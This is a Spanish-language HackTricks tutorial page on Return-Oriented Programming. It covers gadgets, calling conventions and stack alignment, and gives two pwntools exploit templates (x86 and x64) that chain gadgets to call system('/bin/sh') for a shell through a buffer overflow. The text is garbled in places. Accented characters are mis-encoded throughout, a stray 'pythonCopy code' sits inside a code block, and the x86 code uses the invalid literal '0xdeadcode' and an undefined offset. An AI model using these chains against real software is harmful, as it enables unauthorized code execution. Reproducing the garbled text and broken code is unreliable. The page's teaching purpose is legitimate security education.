# ROP - Programaci贸n Orientada a Retornos

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## **Informaci贸n B谩sica**

**La Programaci贸n Orientada a Retornos (ROP)** es una t茅cnica avanzada de explotaci贸n utilizada para eludir medidas de seguridad como **No Ejecutar (NX)** o **Prevenci贸n de Ejecuci贸n de Datos (DEP)**. En lugar de inyectar y ejecutar shellcode, un atacante aprovecha fragmentos de c贸digo ya presentes en el binario o en bibliotecas cargadas, conocidos como **"gadgets"**. Cada gadget generalmente termina con una instrucci贸n `ret` y realiza una peque帽a operaci贸n, como mover datos entre registros o realizar operaciones aritm茅ticas. Al encadenar estos gadgets, un atacante puede construir una carga 煤til para realizar operaciones arbitrarias, eludiendo efectivamente las protecciones NX/DEP.

### C贸mo Funciona ROP

1. **Secuestro de Flujo de Control**: Primero, un atacante necesita secuestrar el flujo de control de un programa, t铆picamente explotando un desbordamiento de b煤fer para sobrescribir una direcci贸n de retorno guardada en la pila.
2. **Encadenamiento de Gadgets**: Luego, el atacante selecciona cuidadosamente y encadena gadgets para realizar las acciones deseadas. Esto podr铆a implicar configurar argumentos para una llamada de funci贸n, llamar a la funci贸n (por ejemplo, `system("/bin/sh")`), y manejar cualquier limpieza necesaria u operaciones adicionales.
3. **Ejecuci贸n de la Carga til**: Cuando la funci贸n vulnerable retorna, en lugar de regresar a una ubicaci贸n leg铆tima, comienza a ejecutar la cadena de gadgets.

## Cadena ROP en Ejemplo x86

### **Convenciones de Llamada x86 (32 bits)**

* **cdecl**: El llamador limpia la pila. Los argumentos de la funci贸n se empujan a la pila en orden inverso (de derecha a izquierda). **Los argumentos se empujan a la pila de derecha a izquierda.**
* **stdcall**: Similar a cdecl, pero el llamado es responsable de limpiar la pila.

### **Encontrar Gadgets**

Primero, asumamos que hemos identificado los gadgets necesarios dentro del binario o sus bibliotecas cargadas. Los gadgets en los que estamos interesados son:

* `pop eax; ret`: Este gadget saca el valor superior de la pila al registro `EAX` y luego retorna, permiti茅ndonos controlar `EAX`.
* `pop ebx; ret`: Similar al anterior, pero para el registro `EBX`, permitiendo control sobre `EBX`.
* `mov [ebx], eax; ret`: Mueve el valor en `EAX` a la ubicaci贸n de memoria apuntada por `EBX` y luego retorna.
* Adem谩s, tenemos disponible la direcci贸n de la funci贸n `system()`.

### **Cadena ROP**

Usando **pwntools**, preparamos la pila para la ejecuci贸n de la cadena ROP de la siguiente manera con el objetivo de ejecutar `system('/bin/sh')`, nota c贸mo la cadena comienza con:

1. Una instrucci贸n `ret` para prop贸sitos de alineaci贸n (opcional)
2. Direcci贸n de la funci贸n `system` (suponiendo ASLR deshabilitado y libc conocida, m谩s informaci贸n en [**Ret2lib**](ret2lib/))
3. Marcador de posici贸n para la direcci贸n de retorno de `system()`
4. Direcci贸n de la cadena `"/bin/sh"` (par谩metro para la funci贸n system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Cadena ROP en Ejemplo x64

### **Convenciones de llamada x64 (64 bits)**

* Utiliza la convenci贸n de llamada **System V AMD64 ABI** en sistemas tipo Unix, donde los **primeros seis argumentos enteros o de puntero se pasan en los registros `RDI`, `RSI`, `RDX`, `RCX`, `R8` y `R9`**. Los argumentos adicionales se pasan en la pila. El valor de retorno se coloca en `RAX`.
* La convenci贸n de llamada de **Windows x64** utiliza `RCX`, `RDX`, `R8` y `R9` para los primeros cuatro argumentos enteros o de puntero, con argumentos adicionales pasados en la pila. El valor de retorno se coloca en `RAX`.
* **Registros**: Los registros de 64 bits incluyen `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` y `R8` a `R15`.

#### **Encontrar Gadgets**

Para nuestro prop贸sito, nos enfocaremos en gadgets que nos permitir谩n establecer el registro **RDI** (para pasar la cadena **"/bin/sh"** como argumento a **system()**) y luego llamar a la funci贸n **system()**. Supondremos que hemos identificado los siguientes gadgets:

* **pop rdi; ret**: Extrae el valor superior de la pila en **RDI** y luego retorna. Esencial para establecer nuestro argumento para **system()**.
* **ret**: Un retorno simple, 煤til para la alineaci贸n de la pila en algunos escenarios.

Y conocemos la direcci贸n de la funci贸n **system()**.

### **Cadena ROP**

A continuaci贸n se muestra un ejemplo utilizando **pwntools** para configurar y ejecutar una cadena ROP con el objetivo de ejecutar **system('/bin/sh')** en **x64**:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
En este ejemplo:

* Utilizamos el **gadget `pop rdi; ret`** para establecer **`RDI`** en la direcci贸n de **`"/bin/sh"`**.
* Saltamos directamente a **`system()`** despu茅s de establecer **`RDI`**, con la direcci贸n de **`system()`** en la cadena.
* Se utiliza el **`ret_gadget`** para alineaci贸n si el entorno objetivo lo requiere, lo cual es m谩s com煤n en **x64** para garantizar una alineaci贸n adecuada del stack antes de llamar a funciones.

### Alineaci贸n del Stack

**El ABI x86-64** asegura que el **stack est茅 alineado en 16 bytes** cuando se ejecuta una **instrucci贸n call**. **LIBC**, para optimizar el rendimiento, **utiliza instrucciones SSE** (como **movaps**) que requieren esta alineaci贸n. Si el stack no est谩 alineado correctamente (lo que significa que **RSP** no es un m煤ltiplo de 16), las llamadas a funciones como **system** fallar谩n en una **cadena ROP**. Para solucionar esto, simplemente agrega un **gadget ret** antes de llamar a **system** en tu cadena ROP.

## Diferencia principal entre x86 y x64

{% hint style="success" %}
Dado que x64 utiliza registros para los primeros argumentos, a menudo requiere menos gadgets que x86 para llamadas de funci贸n simples, pero encontrar y encadenar los gadgets correctos puede ser m谩s complejo debido al mayor n煤mero de registros y al espacio de direcciones m谩s grande. El mayor n煤mero de registros y el espacio de direcciones m谩s grande en la arquitectura **x64** ofrecen tanto oportunidades como desaf铆os para el desarrollo de exploits, especialmente en el contexto de la Programaci贸n Orientada a Retornos (ROP).
{% endhint %}

## Protecciones

* [**ASLR**](../common-binary-protections/aslr.md)
* [**Canarios de Stack**](../common-binary-protections/stack-canaries.md)

## Otros Ejemplos

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## T茅cnicas basadas en ROP

Observa que ROP es solo una t茅cnica para ejecutar c贸digo arbitrario. Basado en ROP se desarrollaron muchas t茅cnicas Ret2XXX:

* **Ret2lib**: Utiliza ROP para llamar funciones arbitrarias desde una biblioteca cargada con par谩metros arbitrarios (generalmente algo como `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Utiliza ROP para preparar una llamada a una syscall, por ejemplo `execve`, y hacer que ejecute comandos arbitrarios.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: El primero abusar谩 de EBP en lugar de EIP para controlar el flujo y el segundo es similar a Ret2lib pero en este caso el flujo se controla principalmente con direcciones de EBP (aunque tambi茅n es necesario controlar EIP).

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
